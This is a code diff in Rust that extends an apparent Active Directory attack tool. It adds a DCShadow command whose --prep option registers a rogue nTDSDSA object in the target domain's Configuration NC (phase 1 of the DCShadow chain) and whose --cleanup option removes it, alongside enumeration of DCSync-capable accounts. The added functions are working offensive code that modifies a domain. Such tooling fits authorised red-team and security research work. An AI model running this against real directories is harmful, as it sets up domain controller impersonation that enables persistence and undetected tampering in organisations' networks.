@@ -8,6 +8,7 @@ use anyhow::{Context, Result};
 use clap::{Parser, Subcommand};
 
 mod adcs_relay;
+mod dcshadow;
 mod esc_registry;
 mod guided;
 mod host_posture;
@@ -358,9 +359,26 @@ enum AttackCmd {
     Esc4(Esc4Args),
     /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
     Shadowcred(ShadowcredArgs),
-    /// DCShadow — enumerate accounts that already hold DCSync replication rights (the pool of
-    /// principals who could impersonate a DC without a lateral move). Full push not implemented.
-    Dcshadow(ScanArgs),
+    /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
+    /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
+    /// removes it. Full push (phase 2) is not yet implemented.
+    Dcshadow(DcshadowArgs),
+}
+
+#[derive(Parser)]
+struct DcshadowArgs {
+    #[command(flatten)]
+    scan: ScanArgs,
+    /// Register a rogue nTDSDSA with this CN (phase 1). Idempotent: rerunning with the same
+    /// name after a partial failure is safe. Requires Domain Admin or Configuration NC write.
+    #[arg(long)]
+    prep: Option<String>,
+    /// Remove a rogue nTDSDSA previously created with --prep. NoSuchObject is swallowed.
+    #[arg(long)]
+    cleanup: Option<String>,
+    /// AD site name for --prep / --cleanup [default: Default-First-Site-Name].
+    #[arg(long, default_value = "Default-First-Site-Name")]
+    site: String,
 }
 
 #[derive(Parser)]
@@ -4595,9 +4613,37 @@ async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
 /// path to Domain Admin. Full DCShadow *push* (register a rogue nTDSDSA + trigger DrsReplicaAdd)
 /// is not implemented — building it without a live 2016+/2019+/2022+/2025 matrix would ship
 /// blind protocol code. Once the matrix is up, this command grows the push side.
-async fn dcshadow(a: ScanArgs) -> Result<()> {
+async fn dcshadow(a: DcshadowArgs) -> Result<()> {
+    // Prep / cleanup take precedence over the detector; they mutate the target.
+    if let Some(name) = a.prep.as_deref() {
+        use adhammer_collector::Collector;
+        let mut coll = Collector::connect(&config(&a.scan)).await?;
+        let dns = dcshadow::prep(&mut coll, name, &a.site).await?;
+        println!("[+] DCShadow prep registered rogue nTDSDSA");
+        println!("    Server : {}", dns.server_dn);
+        println!("    NTDS   : {}", dns.ntds_dn);
+        println!();
+        println!(
+            "    Cleanup: `attack dcshadow --cleanup {name} --site {}`",
+            a.site
+        );
+        return Ok(());
+    }
+    if let Some(name) = a.cleanup.as_deref() {
+        use adhammer_collector::Collector;
+        let mut coll = Collector::connect(&config(&a.scan)).await?;
+        dcshadow::cleanup(&mut coll, name, &a.site).await?;
+        println!(
+            "[+] DCShadow cleanup removed rogue nTDSDSA '{name}' under site '{}'",
+            a.site
+        );
+        return Ok(());
+    }
     use adhammer_graph::ControlPrimitive as P;
-    let snap = Collector::connect(&config(&a)).await?.collect().await?;
+    let snap = Collector::connect(&config(&a.scan))
+        .await?
+        .collect()
+        .await?;
     let graph = adhammer_graph::ControlGraph::build(&snap);
     let mut who = Vec::new();
     for kind in [
